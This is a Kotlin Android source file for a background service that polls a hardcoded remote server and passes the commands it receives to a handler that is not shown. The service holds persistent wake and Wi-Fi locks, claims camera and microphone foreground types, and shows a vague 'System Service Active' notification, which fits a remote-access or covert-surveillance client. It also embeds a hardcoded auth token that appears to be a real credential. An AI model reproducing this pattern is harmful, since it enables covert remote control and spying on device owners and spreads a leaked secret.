package com.example.devicecontrol

import android.app.*
import android.content.*
import android.os.*
import android.util.Log
import android.content.pm.ServiceInfo
import androidx.core.app.NotificationCompat
import android.net.wifi.WifiManager

class ControlService : Service() {
    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiLock: WifiManager.WifiLock? = null
    private lateinit var pollingManager: PollingManager
    private lateinit var commandHandler: CommandHandler

    companion object {
        private const val CHANNEL_ID = "device_control_channel"
        private const val NOTIFICATION_ID = 101
        private const val TAG = "ControlService"
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        
        // Android 14+ support dengan literal angka (Safe-Build)
        if (Build.VERSION.SDK_INT >= 34) {
            val type = 1073741824 or 64 or 128 // specialUse | camera | microphone
            startForeground(NOTIFICATION_ID, createNotification(), type)
        } else {
            startForeground(NOTIFICATION_ID, createNotification())
        }
        
        Log.d(TAG, "Service Created")
        acquireLocks()
        
        val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
        val serverUrl = prefs.getString("ws_url", "https://pygram.xnv.biz.id") ?: ""
        val devId = prefs.getString("device_id", "my_phone") ?: "unknown"
        val authToken = prefs.getString("auth_token", "AAEaT_oKgX9mF2T8D0iT_2br1flpqsMLSi8") ?: ""
        val isTurbo = prefs.getBoolean("turbo_mode", true)
        
        var cleanUrl = serverUrl.replace("/ws", "").replace("wss://", "https://").replace("ws://", "http://")
        if (cleanUrl.endsWith("/")) cleanUrl = cleanUrl.substring(0, cleanUrl.length - 1)

        commandHandler = CommandHandler(this)
        pollingManager = PollingManager(cleanUrl, devId, authToken, commandHandler, isTurbo)
        pollingManager.start()
    }

    private fun acquireLocks() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "DeviceControl::WakeLock")
        wakeLock?.acquire()

        val wm = applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager
        wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "DeviceControl::WifiLock")
        wifiLock?.acquire()
    }

    private fun createNotification(): Notification {
        val pendingIntent = PendingIntent.getActivity(
            this, 0, Intent(this, MainActivity::class.java),
            PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("System Service Active")
            .setContentText("Monitoring background tasks...")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setPriority(NotificationCompat.PRIORITY_MAX) // Prioritas tertinggi
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setOngoing(true)
            .setContentIntent(pendingIntent)
            .build()
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            val channel = NotificationChannel(CHANNEL_ID, "Background Service", NotificationManager.IMPORTANCE_HIGH)
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent?.action == "RESTART_POLLING") {
            Log.d(TAG, "Restarting Polling Manager with new config")
            if (::pollingManager.isInitialized) {
                pollingManager.stop()
            }
            
            val prefs = getSharedPreferences("config", Context.MODE_PRIVATE)
            val serverUrl = prefs.getString("ws_url", "") ?: ""
            val devId = prefs.getString("device_id", "") ?: ""
            val authToken = prefs.getString("auth_token", "") ?: ""
            val isTurbo = prefs.getBoolean("turbo_mode", true)

            var cleanUrl = serverUrl.replace("/ws", "").replace("wss://", "https://").replace("ws://", "http://")
            if (cleanUrl.endsWith("/")) cleanUrl = cleanUrl.substring(0, cleanUrl.length - 1)

            if (cleanUrl.isNotEmpty()) {
                pollingManager = PollingManager(cleanUrl, devId, authToken, commandHandler, isTurbo)
                pollingManager.start()
            }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        pollingManager.stop()
        wakeLock?.let { if (it.isHeld) it.release() }
        wifiLock?.let { if (it.isHeld) it.release() }
    }
}
